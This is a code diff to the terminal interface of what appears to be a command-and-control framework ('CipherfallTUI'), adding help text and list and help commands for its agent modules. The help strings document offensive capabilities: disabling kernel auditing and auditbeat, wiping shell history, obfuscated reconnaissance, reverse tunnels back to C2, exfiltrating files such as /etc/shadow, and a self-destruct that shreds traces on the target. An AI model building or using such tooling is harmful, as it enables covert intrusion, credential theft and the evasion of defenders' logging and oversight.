@@ -637,6 +637,114 @@ class TerminalTextArea(TextArea):
             self.move_cursor(self.document.end)
 
 
+_MODULE_DOCS: "dict[str, tuple[str, str]]" = {
+    "ghost": (
+        "toggle audit blackout + env scrub (per-agent)",
+        """/module ghost on|off|status
+
+  Toggle ghost mode on selected agent (per-process state).
+  When on, every shell command is wrapped with EchoErase preamble:
+    - auditctl -e 0  + stop auditbeat
+    - HISTFILE=/dev/null, HISTSIZE=0, HISTFILESIZE=0
+    - unset SSH_CLIENT, SUDO_USER, terminal fingerprint vars
+    - neutralize snoopy LD_PRELOAD
+    - ulimit -c 0  (disable core dumps)
+  Audit + auditbeat restored after each command.
+  UPLOAD:/WRITE: ops are not wrapped.
+  Root recommended (auditctl requires CAP_AUDIT_CONTROL).""",
+    ),
+    "heartbeat": (
+        "adjust beacon interval live without restarting agent",
+        """/module heartbeat <INT> <JITTER>
+/module heartbeat status
+
+  Change the agent's beacon interval on the fly.
+  INT    beacon sleep in seconds
+  JITTER random ± added to each sleep
+  Takes effect on the next sleep cycle.
+  Example: /module heartbeat 60 15""",
+    ),
+    "recon": (
+        "run phantom_eye fingerprint on agent (all options cumulative)",
+        """/module recon [--obfuscate] [--delayer INT JITTER] [--renamer]
+
+  Run phantom_eye.sh on the agent.  All flags are opt-in.
+  --obfuscate          pass script through shadowscript.py first
+  --delayer INT JITTER inject random sleep delays between lines
+  --renamer            rename script file to a plausible name
+
+  Application order: delayer → obfuscate → renamer
+  Script sent inline as base64; removed from /tmp after exec.
+  Output: one semicolon-delimited phantom_eye line (~10-30s).""",
+    ),
+    "relay": (
+        "open TCP tunnel from agent back to C2",
+        """/module relay [start [port]]
+
+  Start a TCP relay on the agent.
+  CF agent  : opens reverse TCP tunnel on port (default 443) to the Worker.
+  NTP agent : opens local TCP listener on port (default 123) forwarding to
+              C2_HOST:443; bypasses UDP/123 packet-size limit for future cmds.
+  Example: /module relay start 8443""",
+    ),
+    "upload": (
+        "send a local file to the agent",
+        """/module upload <local_path> [remote_path]
+
+  Read local_path, base64-encode, push to agent via shell command.
+  Default remote path: /tmp/<filename>
+  Practical limit: ~few MB (CF Workers 100 MB cap).
+  For large binaries run /module relay first.
+  Example: /module upload /tmp/exploit.py /opt/exp.py""",
+    ),
+    "download": (
+        "fetch a remote file from the agent",
+        """/module download <remote_path> [local_path]
+
+  Retrieve a file from the agent to the operator machine.
+  Default local path: downloads/<filename>
+  CF agent  : single UPLOAD: task, no size limit beyond CF 100 MB cap.
+  NTP agent : gzip+chunk protocol (550 chars/chunk, ~110 B/s text).
+              For files > 50 KB run /module relay first.
+  Example: /module download /etc/shadow""",
+    ),
+    "save": (
+        "dump all agent task outputs to a readable log file",
+        """/module save [output_file]
+
+  Fetch all completed tasks for the selected agent and write them
+  to a formatted log file.
+  Default path: logs/<agent_id[:8]>_<YYYYMMDD_HHMMSS>.log
+  Each entry includes: task id, command, sent time, received time,
+  and the full output.
+  Example: /module save /tmp/session.log""",
+    ),
+    "suicide": (
+        "self-destruct agent and wipe traces on target",
+        """/module suicide
+
+  Sends the agent a self-destruct command (confirmation required).
+  Sequence on agent (2s after sending [suicide: ok]):
+    1. auditctl -e 0  (disable kernel audit)
+    2. Zero shell history env vars
+    3. shred -u <agent.py>  (fallback: rm -f)
+    4. rm -rf <agent.pyc> __pycache__/
+    5. shred ~/.bash_history ~/.zsh_history etc.
+    6. find /tmp -name '.*' -user <agent_user> -delete
+    7. kill <pid>
+  TUI auto-removes agent from DB on receipt of [suicide: ok].
+  Root recommended for shred and auditctl.""",
+    ),
+    "list": (
+        "list all available /module commands",
+        "/module list\n\n  Print this list.",
+    ),
+    "help": (
+        "show usage for a module",
+        "/module help [module_name]\n\n  With no argument: list all modules.\n  With a name: show detailed usage for that module.",
+    ),
+}
+
 _COMPLETIONS: list[str] = [
     "/module ghost on",
     "/module ghost off",
@@ -657,6 +765,16 @@ _COMPLETIONS: list[str] = [
     "/module save",
     "/module save ",
     "/module suicide",
+    "/module list",
+    "/module help",
+    "/module help ghost",
+    "/module help heartbeat",
+    "/module help recon",
+    "/module help relay",
+    "/module help upload",
+    "/module help download",
+    "/module help save",
+    "/module help suicide",
 ]
 
 
@@ -1179,18 +1297,43 @@ class CipherfallTUI(App):
         if event.input.id != "cmd-input":
             return
         cmd = event.value.strip()
-        if not cmd or not self._selected_agent:
-            return
         event.input.value = ""
         self.query_one("#cmd-hint", Static).update("")
         self._autocomplete_matches = []
         self._autocomplete_idx = -1
+        if not cmd:
+            return
+        log = self.query_one("#output-log", OutputTextArea)
+        if cmd == "/module list":
+            log.clear()
+            lines = ["/module list — available modules\n"]
+            for name, (short, _) in _MODULE_DOCS.items():
+                lines.append(f"  {name:<12}  {short}")
+            log.write_raw("\n".join(lines))
+            return
+        if cmd.startswith("/module help"):
+            parts = cmd.split(None, 2)
+            mod = parts[2].strip() if len(parts) > 2 else ""
+            log.clear()
+            if mod:
+                if mod in _MODULE_DOCS:
+                    log.write_raw(_MODULE_DOCS[mod][1])
+                else:
+                    log.write_raw(f"unknown module: {mod}\nrun /module list to see all modules")
+            else:
+                lines = ["/module help — module reference\n"]
+                for name, (_, full) in _MODULE_DOCS.items():
+                    lines.append(full)
+                    lines.append("")
+                log.write_raw("\n".join(lines))
+            return
+        if not self._selected_agent:
+            return
         if not self._cmd_history or self._cmd_history[0] != cmd:
             self._cmd_history.insert(0, cmd)
             if len(self._cmd_history) > 100:
                 self._cmd_history.pop()
         self._history_idx = -1
-        log = self.query_one("#output-log", OutputTextArea)
         _download_local  = ""
         _download_remote = ""
         _is_ntp          = False
